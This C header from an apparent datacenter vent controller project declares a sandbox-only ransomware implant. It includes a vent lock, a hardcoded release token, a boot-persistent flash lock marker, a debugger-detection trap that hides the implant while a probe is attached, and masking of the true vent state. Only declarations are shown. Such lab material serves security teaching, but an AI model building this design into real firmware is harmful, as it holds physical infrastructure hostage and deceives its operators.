// MIT License
//
// Copyright (c) 2026 Kevin Thomas
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.
//
// Author:  Kevin Thomas
// Email:   kevin@mytechnotalent.com
// GitHub:  https://github.com/mytechnotalent/datacenter-vent-controller
// File:    implant.h
// Desc:    Declares the SANDBOX_ONLY FROSTLINE ransom locker: the vent
//          lock, the magic release token, the reserved-sector lock
//          marker, and the CoreDebug anti-debug trap. Compiled only
//          under SANDBOX_ONLY.
// Created: 2026

#ifndef IMPLANT_H
#define IMPLANT_H

#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>

/**
 * @brief Magic release token that breaks the vent ransom lock.
 *
 * The locker unlocks only when this exact token is presented to
 * implant_release. Anything else leaves the vent locked.
 */
#define VENT_IMPLANT_RELEASE_MAGIC "VAULT-RELEASE-2026"

/**
 * @brief Length in bytes of the magic release token.
 */
#define VENT_IMPLANT_RELEASE_MAGIC_LEN 18u

/**
 * @brief Lock marker byte written into the reserved flash sector.
 */
#define VENT_IMPLANT_LOCK_MARKER 0x4Cu

/**
 * @brief Offset of the reserved flash sector used by the lock marker.
 *
 * The final 4 KiB sector of the 4 MiB flash, well beyond the firmware.
 */
#define VENT_IMPLANT_RESERVE_OFFSET 0x3FF000u

/**
 * @brief Reserved flash sector address used by the lock marker.
 */
#define VENT_IMPLANT_RESERVE_ADDR 0x103FF000u

/**
 * @brief CoreDebug DHCSR register address used by the anti-debug trap.
 */
#define VENT_IMPLANT_DHCSR_ADDR 0xE000EDF0u

/**
 * @brief CoreDebug DHCSR bit that reports an enabled debugger.
 */
#define VENT_IMPLANT_DHCSR_DEBUGEN 0x00000001u

/**
 * @brief CoreDebug DHCSR bit that reports a halted core.
 */
#define VENT_IMPLANT_DHCSR_HALT 0x00000002u

/**
 * @brief Number of ticks between autonomous lock re-assertions.
 */
#define VENT_IMPLANT_TICK_INTERVAL 4u

/**
 * @brief Initialize the locker and re-install from the reserved sector.
 *
 * On first run the locker writes its lock marker into the reserved flash
 * sector and locks the vent. On every later boot the marker is present,
 * so the vent is re-locked without any firmware change. The locker stays
 * benign while a debug probe is attached.
 *
 * @param void No parameters.
 * @return void
 */
void implant_init(void);

/**
 * @brief Advance the locker by one tick and re-assert the lock.
 *
 * @param void No parameters.
 * @return void
 */
void implant_tick(void);

/**
 * @brief Report whether the ransom lock is currently active.
 *
 * @param void No parameters.
 * @return bool true when the vent is held closed by the locker.
 */
bool implant_lock_active(void);

/**
 * @brief Report whether the locker should mask the true vent state.
 *
 * @param void No parameters.
 * @return bool true when the maintenance mask is active.
 */
bool implant_mask_active(void);

/**
 * @brief Report whether a debug probe is attached via CoreDebug DHCSR.
 *
 * @param void No parameters.
 * @return bool true when C_DEBUGEN or C_HALT is set.
 */
bool implant_debug_attached(void);

/**
 * @brief Report whether the reserved-sector lock marker is set.
 *
 * @param void No parameters.
 * @return bool true when the lock marker occupies the reserved sector.
 */
bool implant_marker_set(void);

/**
 * @brief Lock the vent and persist the reserved-sector lock marker.
 *
 * @param void No parameters.
 * @return void
 */
void implant_lock(void);

/**
 * @brief Release the lock only when the magic release token matches.
 *
 * A mismatched token, a null pointer, or an attached debug probe leaves
 * the vent locked. On a successful release the lock marker is cleared so
 * the vent is not re-locked on the next boot.
 *
 * @param token Pointer to the candidate release token bytes.
 * @param len Number of candidate token bytes.
 * @return bool true when the lock was released.
 */
bool implant_release(const uint8_t *token, size_t len);

/**
 * @brief Clear the lock, disable re-locking, and clear the lock marker.
 *
 * @param void No parameters.
 * @return void
 */
void implant_neutralize(void);

/**
 * @brief Return the number of times the locker has locked this boot.
 *
 * @param void No parameters.
 * @return size_t Number of lock operations.
 */
size_t implant_lock_count(void);

#endif // IMPLANT_H
